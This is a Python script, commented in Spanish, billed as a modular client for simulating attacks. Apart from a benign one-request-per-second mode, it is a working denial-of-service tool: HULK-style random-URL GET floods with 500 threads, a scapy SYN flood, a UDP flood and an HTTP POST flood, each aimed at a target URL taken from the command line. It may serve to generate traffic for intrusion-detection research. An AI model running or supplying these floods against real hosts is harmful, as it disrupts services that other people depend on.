import requests
import threading
import time
import random
import string
import socket
from scapy.all import IP, TCP, send
import socket



def benign_attack(target_url, duration):
    """Envía peticiones normales a ritmo constante."""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            r = requests.get(target_url)
            print(f"[BENIGN] Status: {r.status_code}")
        except Exception as e:
            print(f"[BENIGN] Error: {e}")
        time.sleep(1)  # 1 petición por segundo

def hulk_attack(target_url, duration):
    """Envía muchas peticiones concurrentes con URLs aleatorias."""
    def send_request():
        rand_str = ''.join(random.choices(string.ascii_letters, k=8))
        try:
            r = requests.get(f"{target_url}/?{rand_str}")
            print(f"[HULK] Status: {r.status_code}")
        except Exception as e:
            print(f"[HULK] Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(500):  # 500 peticiones concurrentes
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

def synflood_attack(target_url, duration):
    """Simula un ataque SYN Flood (requiere privilegios root)."""

    host = target_url.split("//")[1].split(":")[0]
    end_time = time.time() + duration

    def send_syn():
        count = 0
        src_ip = "192.168.1.100"  # IP fija origen
        while time.time() < end_time:
            ip = IP(src=src_ip, dst=host)
            tcp = TCP(sport=random.randint(1024,65535), dport=8080, flags="S", seq=random.randint(1000,9000))
            packet = ip / tcp
            send(packet, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"Thread {threading.get_ident()}: Sent {count} SYN packets")

    print(f"Starting SYN flood attack on {host} for {duration} seconds with 100 threads")

    threads = []
    for _ in range(100):
        t = threading.Thread(target=send_syn)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("SYN flood attack finished")


def udpflood_attack(target_url, duration):
    """Simula un ataque UDP Flood."""
    def send_packet():
        host = target_url.split("//")[1].split(":")[0]
        port = 8080
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        msg = random._urandom(1024)
        try:
            sock.sendto(msg, (host, port))
            print(f"[UDP-FLOOD] Sent to {host}:{port}")
        except Exception as e:
            print(f"[UDP-FLOOD] Error: {e}")
        finally:
            sock.close()

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(100):
            t = threading.Thread(target=send_packet)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

def postflood_attack(target_url, duration):
    """Simula un ataque HTTP POST Flood."""
    def send_post():
        try:
            payload = {"data": random._urandom(512).hex()}
            r = requests.post(target_url, data=payload)
            print(f"[POST-FLOOD] Status: {r.status_code}")
        except Exception as e:
            print(f"[POST-FLOOD] Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(100):
            t = threading.Thread(target=send_post)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

def run_attack(attack_type, target_url, duration):
    if attack_type == "benign":
        benign_attack(target_url, duration)
    elif attack_type == "hulk":
        hulk_attack(target_url, duration)
    elif attack_type == "synflood":
        synflood_attack(target_url, duration)
    elif attack_type == "udpflood":
        udpflood_attack(target_url, duration)
    elif attack_type == "postflood":
        postflood_attack(target_url, duration)
    else:
        print(f"Ataque {attack_type} no implementado. Opciones válidas: benign, hulk, goldeneye, slowhttptest, heartbleed, synflood, udpflood, postflood.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Cliente modular para simular ataques.")
    parser.add_argument("--type", required=True,
                        help="Tipo de ataque: benign, hulk, synflood, udpflood, postflood")
    parser.add_argument("--url", required=True, help="URL objetivo, ej: http://192.168.1.140:8080")
    parser.add_argument("--duration", type=int, default=60, help="Duración en segundos")

    args = parser.parse_args()
    run_attack(args.type.lower(), args.url, args.duration)
